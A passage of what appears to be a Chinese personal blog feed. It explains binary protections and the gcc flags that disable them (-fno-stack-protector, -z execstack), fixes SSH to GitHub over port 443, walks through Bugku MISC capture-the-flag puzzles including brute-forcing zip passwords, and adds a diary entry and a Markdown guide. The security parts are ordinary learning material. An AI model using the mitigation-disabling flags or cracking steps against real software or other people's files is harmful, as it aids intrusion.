class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o test test.c  &#x2F;&#x2F;禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure><h1 id="FORTIFY-轻微的检查"><a href="#FORTIFY-轻微的检查" class="headerlink" title="FORTIFY(轻微的检查)"></a>FORTIFY(轻微的检查)</h1><p>fority其实是非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memepy,stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf， vsprintf，vsnprintf, gets以及宽字符的变体。FORTIFY_ SOURCE设为1,并且将编译器设置为优化1(gcc -01)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不会开这个检查 </span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c &#x2F;&#x2F; 较弱的检查 </span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 仅仅只会在编译时进⾏检查 (特别像某些头⽂件 #include &lt;str _FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编 </span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c &#x2F;&#x2F; 较强的检查 gcc -D_FORTIFY_SOURCE&#x3D;2 程序执⾏时也会有检查 (如果检查到缓冲区溢出，就终⽌程序) _FORTIFY_SOURCE设为2，有些检查功能会加⼊，但是这可能导致程序崩溃。</span><br></pre></td></tr></table></figure><h1 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h1><p>NX（ DEP）的基本原理是将数据所在内存⻚标识为不可执⾏,当程序溢出成功转⼊shellcode时，程序会尝试在数据⻚⾯上执⾏指令，此时CPU就会抛出异常 ,⽽不是去执⾏恶意指令 。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c &#x2F;&#x2F; 禁⽤NX保护 </span><br><span class="line">gcc -z noexecstack -o test test.c &#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure><p>在Windows下，类似的概念为DEP（数据执行保护）,数据执⾏保护( D E P ) （ Data Execution Prevention ） 是⼀套软硬件技术，能 够 在 内 存上执⾏额外检查以帮助防⽌在系统上运⾏恶意代码 ,在最新版的Visual Studio中默认开启了DEP编译选项。</p><h1 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h1><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。PIE和ASLR不是一样的作用，ASLR只能对堆、栈,ibc和mmap随机化，而不能对代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。区别是ASLR是系统功能选项，PIE和PIC是编译器功能选项。联系点在于在开启ASLR之后，PIE才会生效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启PIE </span><br><span class="line">gcc -fpie -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时强度为1 </span><br><span class="line">gcc -fPIE -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时为最⾼强度2 </span><br><span class="line">gcc -fpic -o test test.c &#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c &#x2F;&#x2F; 开启PIC，此时为最⾼强度2，不会开启PIE</span><br></pre></td></tr></table></figure><h1 id="ASLR-Address-Space-Layout-Randomization"><a href="#ASLR-Address-Space-Layout-Randomization" class="headerlink" title="ASLR (Address Space Layout Randomization)"></a>ASLR (Address Space Layout Randomization)</h1><p>ASLR是⼀种针对缓冲区溢出的安全保护技术,通过对堆栈 、共享库映射等线性区布局的随机化，通过增加攻击者预测⽬的地址的难度,防⽌攻击者直接定位攻击代码位置,达到阻⽌溢出攻击的⽬的。 </p><p>参考文章：<a href="https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH连接失败</title>
      <link href="/post/SSH%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5.html"/>
      <url>/post/SSH%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>闲的无聊就整了一下博客，结果出大问题了，之前的备份又删了，所以不得不重建，这次重建花了整整一天，虽说浪费时间但是还是有所收获</p></blockquote><p>搭建博客视频网上一大堆，这里就不多讲了，这里就讲一下错误和如何解决</p><h1 id="ssh-connect-to-host-github-com-port-22-Connection-timed-out"><a href="#ssh-connect-to-host-github-com-port-22-Connection-timed-out" class="headerlink" title="ssh: connect to host github.com port 22: Connection timed out"></a>ssh: connect to host github.com port 22: Connection timed out</h1><p>这个问题烦了我几个小时，网上的解决方法参差不齐（反正我通过网上的方法没用解决），最后还是看官方的解决方法（还是官方的靠谱）<a href="https://docs.github.com/en/github/authenticating-to-github/using-ssh-over-the-https-port">Using SSH over the HTTPS port</a>。</p><p>出现这个问题是因为22端口被占用或者防火墙不允许ssh连接。解决方法是通过通过HTTPS启用SSH连接，命令：ssh -T -p 443 <a href="mailto:&#x67;&#x69;&#116;&#64;&#x73;&#x73;&#104;&#46;&#x67;&#105;&#x74;&#104;&#x75;&#x62;&#x2e;&#x63;&#111;&#x6d;">&#x67;&#x69;&#116;&#64;&#x73;&#x73;&#104;&#46;&#x67;&#105;&#x74;&#104;&#x75;&#x62;&#x2e;&#x63;&#111;&#x6d;</a>，运行时输入yes，这样可以强制连接，连接成功后就可以进行下一步操作了（不成功可以看官方给的<a href="https://docs.github.com/en/articles/error-permission-denied-publickey">故障排除指南</a>），成功后，在.ssh文件夹中创建一个config文件（千万千万别加后缀名！）内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  Hostname ssh.github.com</span><br><span class="line">  Port 443</span><br><span class="line">  User git</span><br></pre></td></tr></table></figure><p>最后输入：ssh -T <a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#104;&#117;&#98;&#x2e;&#x63;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#104;&#117;&#98;&#x2e;&#x63;&#x6f;&#x6d;</a>看是否成功连接</p><p>成功连接如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">&gt; Hi username! You&#39;ve successfully authenticated, but GitHub does not</span><br><span class="line">&gt; provide shell access.</span><br></pre></td></tr></table></figure><p>简单介绍一下<a href="https://ru.wikipedia.org/wiki/SSH">SSH</a>，博客上传时，如果没用通过ssh连接的话，需要输入密码，通过ssh远程连接以后就不需要了</p>]]></content>
      
      
      <categories>
          
          <category> 问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugkuMISC</title>
      <link href="/post/bugku-MISC.html"/>
      <url>/post/bugku-MISC.html</url>
      
        <content type="html"><![CDATA[<h1 id="BUGKU-misc部分"><a href="#BUGKU-misc部分" class="headerlink" title="BUGKU misc部分"></a>BUGKU misc部分</h1><h2 id="1-这是一张单纯的图片"><a href="#1-这是一张单纯的图片" class="headerlink" title="1 这是一张单纯的图片"></a>1 这是一张单纯的图片</h2><p>先看了一下属性，发现并没有什么有用的信息，打开就是上面那张图，没有上面异样，</p><img src="/images/21.png" height="500" width="600" /><p>直接丢winhex，拖至最底，发现是unicode加密</p><img src="/images/22.png" height="500" width="600" /><p>发现是unicode加密，直接解码成ASCII，得到flag</p><img src="/images/23.png" height="500" width="600" /><hr><h2 id="2-隐写"><a href="#2-隐写" class="headerlink" title="2 隐写"></a>2 隐写</h2><p>看到题目就知道是图片隐写，对图片进行校验和，发现结果有问题，说明照片高度被修改了</p><img src="/images/24.png" height="500" width="600" /><p>修改高度得到flag</p><img src="/images/25.png" height="400" width="300" /><hr><h2 id="3-telnet"><a href="#3-telnet" class="headerlink" title="3 telnet"></a>3 telnet</h2><p>下载附件后打开，直接追踪TCP流就得到了flag</p><img src="/images/26.png" height="500" width="600" /><hr><h2 id="4-眼见非实"><a href="#4-眼见非实" class="headerlink" title="4 眼见非实"></a>4 眼见非实</h2><p>打开后发现文件是损坏的而且出现了PK字符，猜测里面藏有压缩包，于是改成压缩包形式打开</p><img src="/images/27.png" height="500" width="600" /><p>在word里面的document.xml里面发现了flag</p><img src="/images/28.png" height="500" width="600" /><hr><h2 id="5-啊哒"><a href="#5-啊哒" class="headerlink" title="5 啊哒"></a>5 啊哒</h2><p>老规矩，打开照片看属性，发现照相机型号有东西，之后应该用得上</p><img src="/images/29.png" height="600" width="600" /><p>用binwalk查看，发现里面藏有一个压缩包，用foremost进行分离得到压缩包，打开发现是加密的，尝试了照相机型号，发现密码错误，分析了一下那串照相机型号，发现是十六进制，之后解码得到密码</p><img src="/images/30.png" height="600" width="600" /><p>打开得到flag</p><img src="/images/31.png" height="600" width="600" /><hr><h2 id="6-ping"><a href="#6-ping" class="headerlink" title="6 ping"></a>6 ping</h2><p>用wireshark打开后发现十六进制旁边一个f，打开其它的发现组合起来是flag</p><img src="/images/32.png" height="600" width="500" /><hr><h2 id="7-赛博朋克"><a href="#7-赛博朋克" class="headerlink" title="7 赛博朋克"></a>7 赛博朋克</h2><p>打开后发现就一个光秃秃的加密文件，不用猜都知道是伪加密，丢进winhex修改一下就可以打开了</p><img src="/images/33.png" height="600" width="500" /><p>打开文件后发现是一堆乱码，丢进winhex发现是png格式照片</p><img src="/images/34.png" height="600" width="400" /><p>修改一下后缀名图片就出来了，不过好像flag还没出来，属性里面也没什么东西，校验和也正确，binwalk也没查出问题</p><img src="/images/35.png" height="600" width="400" /><img src="/images/36.png" height="400" width="600" /><p>最后推测一个是lsb隐写，果不其然，得到flag</p><img src="/images/37.png" height="500" width="600" /><hr><h2 id="8-贝斯手"><a href="#8-贝斯手" class="headerlink" title="8 贝斯手"></a>8 贝斯手</h2><p>打开介绍发现是对图片上人物介绍，刚想关闭发现最下面还有东西，发现密码是四位数和这个贝斯手有关</p><img src="/images/38.png" height="500" width="600" /><p>懒得搜直接暴力破解</p><img src="/images/39.png" height="500" width="600" /><p>打开后发现是一串加密字符，5+58应该加密方式MD5和base58</p><img src="/images/40.png" height="500" width="600" /><p>解码得到flag</p><img src="/images/41.png" height="500" width="500" /><img src="/images/42.png" height="500" width="600" /><hr><h2 id="9-又一张图片，还单纯吗"><a href="#9-又一张图片，还单纯吗" class="headerlink" title="9 又一张图片，还单纯吗"></a>9 又一张图片，还单纯吗</h2><p>打开属性发现没有有用的信息，丢进winhex里面也没发现什么，用binwalk查看发现照片里面有其它jpg照片，用forem分离</p><img src="/images/43.png" height="500" width="600" /><p>发现图片里面有flag（不过这个flag有点长，有点离谱）</p><img src="/images/44.png" height="500" width="600" /><hr><h2 id="10-猜"><a href="#10-猜" class="headerlink" title="10 猜"></a>10 猜</h2><p>签到题，百度识图，发现是刘亦菲，得到flag（注意flag格式）</p><hr><h2 id="11-宽带信息泄露"><a href="#11-宽带信息泄露" class="headerlink" title="11 宽带信息泄露"></a>11 宽带信息泄露</h2><p>下载RouterPassView，用这个搜索username（用户名）</p><img src="/images/53.png" height="500" width="600" /><hr><h2 id="12-隐写2"><a href="#12-隐写2" class="headerlink" title="12 隐写2"></a>12 隐写2</h2><p>直接丢进winhex，发现jpg图片结尾后面有压缩包的字符</p><img src="/images/45.png" height="500" width="600" /><p>用foremost分离得到一个加密的文件和密码提示，解密（直接爆破，反正是三位数）得到一张图片</p><img src="/images/46.png" height="500" width="600" /><p>老规矩丢winhex，发现最后有flag</p><img src="/images/47.png" height="500" width="600" /><hr><h2 id="13-多种方法解决"><a href="#13-多种方法解决" class="headerlink" title="13 多种方法解决"></a>13 多种方法解决</h2><p>这道题提示说有二维码，打开附件发现是一个exe可执行文件（尝试打开发现无法运行），直接丢winhex</p><img src="/images/48.png" height="500" width="600" /><p>发现是旁边是加密的图片编码，直接在线解码得到flag</p><img src="/images/49.png" height="500" width="600" /><hr><h2 id="14-闪的好快"><a href="#14-闪的好快" class="headerlink" title="14 闪的好快"></a>14 闪的好快</h2><p>emmmm，这道题挺简单的就是好烦，用Stegsolve.jar一帧一帧看，扫码，flag就出来了</p><hr><h2 id="15-come-game"><a href="#15-come-game" class="headerlink" title="15 come_game"></a>15 come_game</h2><p>打开后是个游戏，每次死亡都会多个文件，找到save1将它丢尽winhex里面，将2AC改成5AC在进游戏就可以得到flag，当然如果觉得能闯过去也应该能得到flag。（我没试过，不确定能不能行，提醒一下这个游戏打开了好像不能关闭）</p><img src="/images/50.png" height="500" width="600" /><hr><h2 id="16-白哥的鸽子"><a href="#16-白哥的鸽子" class="headerlink" title="16 白哥的鸽子"></a>16 白哥的鸽子</h2><p>直接丢进winhex里面，发现照片结尾后面多出一些字符，分析一下就知道是栅栏加密</p><img src="/images/51.png" height="500" width="600" /><p>解密（密匙我是一个一个试的，不过还好就是3，后面才知道那个提示“咕咕咕”好像就代表key=3）</p><img src="/images/52.png" height="500" width="600" /><h2 id="17-linux"><a href="#17-linux" class="headerlink" title="17 linux"></a>17 linux</h2><p>看到题目就知道要用Linux系统</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快乐周五</title>
      <link href="/post/tuoli.html"/>
      <url>/post/tuoli.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>这是这几个月最值得纪念的周五，体验了脱离学校的快乐</p></blockquote><p>2020.12.13</p><p>  晚上和社团其它人一起谋划着“出校大计”，原本定在周六，但是由于学校要体测（挺佩服学校挑时间的能力🤬），不得不将时间改成周五，让快乐减少了一半😔</p><p>2020.12.15</p><p>  果然到了周末就会发现屁事很多😔，一个个周末都有事，只剩几个大男人可以出去，这次出校也变成了“罗汉出行”，照这样下去，不知道之后几天会发生什么😱</p><p>2020.12.17</p><p>  原本课上得好好的，突然一个朋友说周六体测取消了，改了时间，我直接当场爆炸🤬，没办法假条都上交了，时间也不能修改，只能认命</p><p>2020.12.18</p><p>  原本计划好的五个人，要走的时候最后一个人掉链子😔，最后变成四罗汉出行。</p><p>开始打算看电影，但是觉得没什么好看的电影加上时间不够，所以改成了密室逃脱（补充一下，有个当地人带路非常重要😃）</p><img src="/images/17.jpg" height="400" width="350" /><img src="/images/16.jpg" height="400" width="350" /><img src="/images/15.jpg" height="400" width="350" /><p>游戏体验还不错（除了那个怕鬼的师兄），还送了一个纪念品（下面的是买奶茶送的纪念品）😃</p><img src="/images/20.jpg" height="400" width="350" /><p>最后去吃了碗拉面，味道还是相当不错的，就是价格有点小贵/(ㄒoㄒ)/~~</p><p>饭后去逛了一下，带点东西给室友，最后打的回校</p><img src="/images/19.jpg" height="400" width="350" /><p>  这次行程还是不错的（比呆在学校好多了），发现南昌还是蛮好玩的，但就是不知道下次出去是什么时候了😔</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 娱乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown语法</title>
      <link href="/post/markdown.html"/>
      <url>/post/markdown.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>搭建好博客后没有直接开始写文章是因为写文章时遇到了很多问题，之后去b站和百度上了解了一下，学到了一些关于markdown语法的使用方法，在此分享一下</p></blockquote><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p>“#”一级标题</p><p>“##”二级标题</p><p>……（共六级标题，“#”后面要空一格）</p><p>效果如图</p><img src="/images/12.jpg" height="400" width="350" /><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>&lt;一级引用</p><p>&lt;&lt;二级引用</p><p>&lt;&lt;&lt;三级引用</p><p>……(可不断嵌套）</p><p>效果如图</p><img src="/images/13.jpg" height="550" width="500" /><h1 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h1><h3 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h3><p>要加粗的文字左右分别用两个*号包起来</p><h3 id="加粗"><a href="#加粗" class="headerlink" title="加粗"></a>加粗</h3><p>要加粗的文字左右分别用两个*号包起来</p><h3 id="斜体加粗"><a href="#斜体加粗" class="headerlink" title="斜体加粗"></a>斜体加粗</h3><p>要倾斜和加粗的文字左右分别用三个*号包起来</p><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><p>要加删除线的文字左右分别用两个~号包起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**这是加粗的文字**</span><br><span class="line">*这是倾斜的文字*&#96;</span><br><span class="line">***这是斜体加粗的文字***</span><br><span class="line">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure><h3 id="字体与颜色"><a href="#字体与颜色" class="headerlink" title="字体与颜色"></a>字体与颜色</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;font face&#x3D;&quot;黑体&quot;&gt;我是黑体字&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font face&#x3D;&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font face&#x3D;&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font color&#x3D;red&gt;我是红色&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font color&#x3D;#008000&gt;我是绿色&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font color&#x3D;Blue&gt;我是蓝色&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font size&#x3D;5&gt;我是尺寸&lt;&#x2F;font&gt;</span><br><span class="line">&lt;font face&#x3D;&quot;黑体&quot; color&#x3D;green size&#x3D;5&gt;我是黑体，绿色，尺寸为5&lt;&#x2F;font&gt;</span><br></pre></td></tr></table></figure><h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>可用三个或三个以上“ - ”或者“ _ ”生成分割线（两个个效果都一样)</p><h1 id="隐藏内容"><a href="#隐藏内容" class="headerlink" title="隐藏内容"></a>隐藏内容</h1><p><em>(隐藏内容不会直接显示在博客主页，需要点进去看)</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在&lt;!--more--&gt;输入的文章内容不会直接显示在博客页面</span><br></pre></td></tr></table></figure><h1 id="图片引用"><a href="#图片引用" class="headerlink" title="图片引用"></a>图片引用</h1><h3 id="链接引用"><a href="#链接引用" class="headerlink" title="链接引用"></a>链接引用</h3><p>在src=后面加入照片地址，width指照片宽度，height指照片高度</p><p>例如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;http://pic11.photophoto.cn/20090626/0036036341009653_b.jpg&quot;</span> width=<span class="string">&quot;251&quot;</span> height=<span class="string">&quot;350&quot;</span> &gt;</span><br></pre></td></tr></table></figure><h3 id="本地引用"><a href="#本地引用" class="headerlink" title="本地引用"></a>本地引用</h3><p>与链接引用类似，不过需要将网址改为路径（如果在相同目录里面，只需要将填写对应文件夹即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&#x2F;images&#x2F;1.jpg&quot; height&#x3D;&quot;400&quot; width&#x3D;&quot;350&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><h1 id="照片居中"><a href="#照片居中" class="headerlink" title="照片居中"></a>照片居中</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align&#x3D;right&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;pic11.photophoto.cn&#x2F;20090626&#x2F;0036036341009653_b.jpg&quot; width&#x3D;&quot;50%&quot; height&#x3D;&quot;50%&quot;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[超链接名](超链接地址 &quot;超链接title&quot;)</span><br><span class="line">title可加可不加</span><br></pre></td></tr></table></figure><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 列表内容</span><br><span class="line">+ 列表内容</span><br><span class="line">* 列表内容</span><br><span class="line"></span><br><span class="line">注意：- + * 跟内容之间都要有一个空格</span><br></pre></td></tr></table></figure><p>三个效果都一样</p><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>数字加点</p><h3 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h3><p>上一级和下一级之间敲三个空格即可</p><p>例如</p><ul><li><p>一级无序列表内容</p><ul><li>二级无序列表内容</li></ul><ul><li>二级无序列表内容</li><li>二级无序列表内容</li></ul></li><li><p>一级无序列表内容</p><ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol></li></ul><ol><li>一级有序列表内容<ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul></li><li>一级有序列表内容<ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol></li></ol><h1 id="视频引用"><a href="#视频引用" class="headerlink" 